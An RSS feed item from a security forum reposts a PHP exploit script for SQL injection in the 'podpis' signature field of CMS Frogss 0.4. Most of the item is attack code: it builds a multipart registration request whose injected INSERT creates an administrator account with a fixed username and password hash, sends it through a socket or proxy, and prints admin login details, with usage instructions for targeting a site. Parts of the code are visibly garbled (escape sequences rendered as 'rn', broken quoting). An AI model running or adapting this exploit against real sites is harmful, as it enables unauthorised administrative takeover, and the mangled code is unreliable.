<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "CMS Frogss &lt;= 0.4 (podpis) Remote SQL Injection Exploit"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
		<description><![CDATA[Latest messages posted in the topic "CMS Frogss &lt;= 0.4 (podpis) Remote SQL Injection Exploit"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>CMS Frogss &amp;lt;= 0.4 (podpis) Remote SQL Injection Exploit</title>
				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?php
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
echo "+rn";
echo "-   - - &#91;DEVIL TEAM THE BEST POLISH TEAM&#93; - -rnrn";
echo "+rn";
echo
"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"rn";
echo "+rnrn";
echo "- CMS frogss &lt;= 0.4 &#40;podpis&#41; SQL Injection Exploit &#91;creat
new admin&#93;"rn";
echo "+"rn";
echo
"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"rn";
echo "+"rn";
echo "- &#91;Script name: CMS frogss v.0.4"rn";
echo "- &#91;Script site:<span class="link"> http://frogss.be/download.php?id=1</span>"rn";
echo "+"rn";
echo
"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"rn";
echo "+"rn";
echo "-          Find by: Kacper &#40;a.k.a Rahim&#41;"rn";
echo "+"rn";
echo "-          Contact: kacper1964@yahoo.pl"rn";
echo "-                        or"rn";
echo "-          <span class="link"> http://www.rahim.webd.pl/</span>"rn";
echo "+"rn";
echo
"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"rn";
echo "+"rn";
echo "- Special Greetz: DragonHeart ;-&#41;"rn";
echo "- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi, nukedclx, mivus
;&#93;"rn";
echo "+"rn";
echo "!@ Przyjazni nie da sie zamienic na marne korzysci
@!"rn";
echo "+"rn";
echo
"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"rn";
echo "+"rn";
echo "-            Z Dedykacja dla osoby,"rn";
echo "-         bez ktorej nie mogl bym zyc..."rn";
echo "-           K.C:* J.M &#40;a.k.a Magaja&#41;"rn";
echo "+"rn";
echo
"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"rn";
echo "+"rn";
echo "Usage: www.site.com /path/ UserName Password proxy
"rn";
echo "ex: www.site.com &lt;= site host "rn";
echo "ex: /path/ &lt;= script path "rn";
echo "ex: Username &lt;= exploit username "rn";
echo "ex: Password &lt;= exploit password "rn";
echo "ex: proxy &lt;= optional ;-&#41; "rn";
echo "+"rn";
echo
"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"rn";
echo "EX: www.site.com /frogss/ Evil hacker 127.0.0.1
"rn";
echo
"+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"rn";

/*
vulnerable code =&gt; module/rejestracja.php line 56-87:
....
function ok&#40;&#41;
{
    global
$login,$haslo,$email,$miasto,$www,$gg,$tlen,$poziom,$podpis,$last_log,$logowan,$komentarzy,$odwiedzin,$ip,$lan;
    $query=mysql_query&#40;"SELECT login FROM uzytkownicy WHERE
login='".$login."'"&#41;;
    if &#40;!$login&#41; {

    echo 'Nie poda³e¶ Loginu';
    } elseif &#40;!$haslo&#41;{
        echo 'Nie poda³e¶ has³a';
    } elseif &#40;!$email&#41;
    {
        echo 'Nie poda³e¶ e-maila';
    } elseif&#40;mysql_num_rows&#40;$query&#41;==0&#41;
{
if&#40;$www=='http://'&#41; $www = '';
if&#40;$gg=='gg:'&#41; $gg = '';
if&#40;$tlen=='tlen:'&#41; $tlen = '';
$haslomd5 = md5&#40;$haslo&#41;;
$ip = $_SERVER&#91;'REMOTE_ADDR'&#93;;
$query1 = "INSERT INTO uzytkownicy VALUES&#40;NOT NULL, '$login',
'$haslomd5', '$email', '$miasto', '$www', '$gg', '$tlen', '$poziom',
'$podpis', NOW&#40;&#41;, '$last_log', '$logowan', '$komentarzy', '$odwiedzin',
'offline', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '',
'', '0', '0', '0', '$ip'&#41;";
$result = mysql_query &#40;$query1&#41;;
if&#40;$result&#41;
        {
            echo '&lt;br&gt;'.$lan&#91;'registration_add'&#93;.'&lt;br&gt;';
        }
        else
        {
            echo
'&lt;br&gt;'.$lan&#91;'registration_add_error'&#93;.'&lt;br&gt;&lt;br&gt;';
        }
}
else
{
....
when we register to new user in $podpis we can insert in  SQL injection
;-&#41;

*/


error_reporting&#40;0&#41;;
ini_set&#40;"max_execution_time",0&#41;;
ini_set&#40;"default_socket_timeout",5&#41;;
ob_implicit_flush &#40;1&#41;;
function show&#40;$headeri&#41;
{
  $ii=0;$ji=0;$ki=0;$ci=0;
  echo '&lt;table border="0"&gt;&lt;tr&gt;';
  while &#40;$ii &lt;= strlen&#40;$headeri&#41;-1&#41;{
    $datai=dechex&#40;ord&#40;$headeri&#91;$ii&#93;&#41;&#41;;
    if &#40;$ji==16&#41; {
      $ji=0;
      $ci++;
      echo "&lt;td&gt;  &lt;/td&gt;";
      for &#40;$li=0; $li&lt;=15; $li++&#41; {
        echo
"&lt;td&gt;".htmlentities&#40;$headeri&#91;$li+$ki&#93;&#41;."&lt;/td&gt;";
		}
      $ki=$ki+16;
      echo "&lt;/tr&gt;&lt;tr&gt;";
    }
    if &#40;strlen&#40;$datai&#41;==1&#41; {
      echo
"&lt;td&gt;0".htmlentities&#40;$datai&#41;."&lt;/td&gt;";
    }
    else {
      echo "&lt;td&gt;".htmlentities&#40;$datai&#41;."&lt;/td&gt;
";
    }
    $ii++;$ji++;
  }
  for &#40;$li=1; $li&lt;=&#40;16 - &#40;strlen&#40;$headeri&#41; % 16&#41;+1&#41;; $li++&#41; {
    echo "&lt;td&gt;  &lt;/td&gt;";
  }
  for &#40;$li=$ci*16; $li&lt;=strlen&#40;$headeri&#41;; $li++&#41; {
    echo
"&lt;td&gt;".htmlentities&#40;$headeri&#91;$li&#93;&#41;."&lt;/td&gt;";
  }
  echo "&lt;/tr&gt;&lt;/table&gt;";
}

$proxy_regex = '&#40;bd{1,3}.d{1,3}.d{1,3}.d{1,3}:d{1,5}b&#41;';

function sendpacket&#40;&#41;
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create&#40;AF_INET, SOCK_STREAM, SOL_TCP&#41;;
  if &#40;$socket &lt; 0&#41; {
    echo "socket_create&#40;&#41; failed: reason: " .
socket_strerror&#40;$socket&#41; . "&lt;br&gt;";
  }
  else {
    $c = preg_match&#40;$proxy_regex,$proxy&#41;;
    if &#40;!$c&#41; {echo 'Not a valid proxy...';
    die;
    }
  echo "OK.&lt;br&gt;";
  echo "Attempting to connect to ".$host." on port
".$port."...&lt;br&gt;";
  if &#40;$proxy==''&#41; {
    $result = socket_connect&#40;$socket, $host, $port&#41;;
  }
  else {
    $parts =explode&#40;':',$proxy&#41;;
    echo 'Connecting to '.$parts&#91;0&#93;.':'.$parts&#91;1&#93;.' proxy...&lt;br&gt;';
    $result = socket_connect&#40;$socket, $parts&#91;0&#93;,$parts&#91;1&#93;&#41;;
  }
  if &#40;$result &lt; 0&#41; {
    echo "socket_connect&#40;&#41; failed.rnReason: &#40;".$result."&#41;
" . socket_strerror&#40;$result&#41; . "&lt;br&gt;&lt;br&gt;";
  }
  else {
    echo "OK.&lt;br&gt;&lt;br&gt;";
    $html= '';
    socket_write&#40;$socket, $packet, strlen&#40;$packet&#41;&#41;;
    echo "Reading response:&lt;br&gt;";
    while &#40;$out= socket_read&#40;$socket, 2048&#41;&#41; {$html.=$out;}
    echo nl2br&#40;htmlentities&#40;$html&#41;&#41;;
    echo "Closing socket...";
    socket_close&#40;$socket&#41;;
  }
  }
}

function refresh&#40;&#41;
{
  flush&#40;&#41;;
  ob_flush&#40;&#41;;
  usleep&#40;5000000000&#41;;
}

function sendpacketii&#40;$packet&#41;
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if &#40;$proxy==''&#41; {
    $ock=fsockopen&#40;gethostbyname&#40;$host&#41;,$port&#41;;
    if &#40;!$ock&#41; {
      echo 'No response from '.htmlentities&#40;$host&#41;; die;
    }
  }
  else {
	$c = preg_match&#40;$proxy_regex,$proxy&#41;;
    if &#40;!$c&#41; {
      echo 'Not a valid prozy...';die;
    }
    $parts=explode&#40;':',$proxy&#41;;
    echo 'Connecting to '.$parts&#91;0&#93;.':'.$parts&#91;1&#93;.' proxy...&lt;br&gt;';
    $ock=fsockopen&#40;$parts&#91;0&#93;,$parts&#91;1&#93;&#41;;
    if &#40;!$ock&#41; {
      echo 'No response from proxy...';die;
	}
  }
  fputs&#40;$ock,$packet&#41;;
  if &#40;$proxy==''&#41; {
    $html='';
    while &#40;!feof&#40;$ock&#41;&#41; {
      $html.=fgets&#40;$ock&#41;;
    }
  }
  else {
    $html='';
    while &#40;&#40;!feof&#40;$ock&#41;&#41; or
&#40;!eregi&#40;chr&#40;0x0d&#41;.chr&#40;0x0a&#41;.chr&#40;0x0d&#41;.chr&#40;0x0a&#41;,$html&#41;&#41;&#41; {
      $html.=fread&#40;$ock,1&#41;;
    }
  }
  fclose&#40;$ock&#41;;echo nl2br&#40;htmlentities&#40;$html&#41;&#41;;
}

function make_seed&#40;&#41;
{
   list&#40;$usec, $sec&#41; = explode&#40;' ', microtime&#40;&#41;&#41;;
   return &#40;float&#41; $sec + &#40;&#40;float&#41; $usec * 100000&#41;;
}

$host=$_POST&#91;host&#93;;$port=$_POST&#91;port&#93;;$path=$_POST&#91;path&#93;;
$USER=$_POST&#91;USER&#93;;$PASS=$_POST&#91;PASS&#93;;$proxy=$_POST&#91;proxy&#93;;

echo "&lt;span class="Stile5"&gt;";

  if &#40;&#40;$host&lt;&gt;''&#41; and &#40;$path&lt;&gt;''&#41;&#41;
  {
    $port=intval&#40;trim&#40;$port&#41;&#41;;
    if &#40;$port==''&#41; {$port=80;}
    if &#40;&#40;$path&#91;0&#93;&lt;&gt;'/'&#41; or &#40;$path&#91;strlen&#40;$path&#41;-1&#93;&lt;&gt;'/'&#41;&#41;
{die&#40;'Error... check the path!'&#41;;}
    if &#40;$proxy==''&#41; {$p=$path;} else
{$p='http://'.$host.':'.$port.$path;}

  }
  if &#40;&#40;$host&lt;&gt;''&#41; and &#40;$path&lt;&gt;''&#41; and &#40;$USER&lt;&gt;''&#41; and
&#40;$PASS&lt;&gt;''&#41;&#41;
  {
  
    $sql="'&#41; INSERT INTO uzytkownicy VALUES&#40;1, Kacper,
b98092e78aa47e68ae2ba617137960a4, devilteam@hackers.pl, NULL,<span class="link"> http://www.rahim.webd.pl/,</span> NULL, NULL, 0, DEVILTEAM, NOW&#40;&#41;, 99999, 99999,
99999, 9999, offline, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0,
4&#41;/*";
    $data='-----------------------------7d62702f250530
    Content-Disposition: form-data; name="login";
    
    '.$USER.'
    -----------------------------7d62702f250530
    Content-Disposition: form-data; name="haslo";
    
    '.$PASS.'
    -----------------------------7d62702f250530
    Content-Disposition: form-data; name="email";
    
    devilteam@polish-hackers.pl
    -----------------------------7d62702f250530
    Content-Disposition: form-data; name="miasto";
    
    localhost
    -----------------------------7d62702f250530
    Content-Disposition: form-data; name="www";
    
   <span class="link"> http://www.rahim.webd.pl/</span>
    -----------------------------7d62702f250530
    Content-Disposition: form-data; name="gg";
    
    000000
    -----------------------------7d62702f250530
    Content-Disposition: form-data; name="tlen";
    
    h20
    -----------------------------7d62702f250530--
    Content-Disposition: form-data; name="podpis";
    
    '.$sql.'
    -----------------------------7d62702f250530--
    ';

    $packet ="POST ".$p."login.php HTTP/1.1rn";
    $packet.="User-Agent: Googlebot/2.1rn";
    $packet.="Host: ".$host."rn";
    $packet.="Accept: text/plainrn";
    $packet.="Referer:<span class="link"> http://</span>".$host.$path."index.php?lang=enrn";
    $packet.="Content-Type: multipart/form-data;
boundary=---------------------------7d62702f250530rn";
    $packet.="Content-Length: ".strlen&#40;$data&#41;."rn";
    $packet.=$data;
	$packet.="Connection: Closern";
    show&#40;$packet&#41;;
    sendpacketii&#40;$packet&#41;;
    if &#40;!eregi&#40;"Location:",$html&#41;&#41; {die&#40;"Failed to
login..."&#41;;}
    $temp=explode&#40;"Set-Cookie: ",$html&#41;;
    $COOKIE='';
    for &#40;$i=1; $i&lt;=6; $i++&#41;
    {
      $temp2=explode&#40;" ",$temp&#91;$i&#93;&#41;;
      $COOKIE.=" ".$temp2&#91;0&#93;;
    }
   if &#40;eregi&#40;"The user has successfully been added",$html&#41;&#41;
{
  echo "exploit succeeded... now login as adminn";
  echo "with username "Kacper"" and password
"devilteam""n";
  echo ".$host."/Administracja/index.php"n";
  echo "Greetz ;-&#41;"n";
}
?&gt;</pre>
		</div>
securitydot.net - 2006-08-27]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3288.hva#18741</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/3288.hva#18741</link>
				<pubDate><![CDATA[Mon, 28 Aug 2006 13:43:25]]> GMT</pubDate>
				<author><![CDATA[ LeonHart]]></author>
			</item>
	</channel>
</rss>
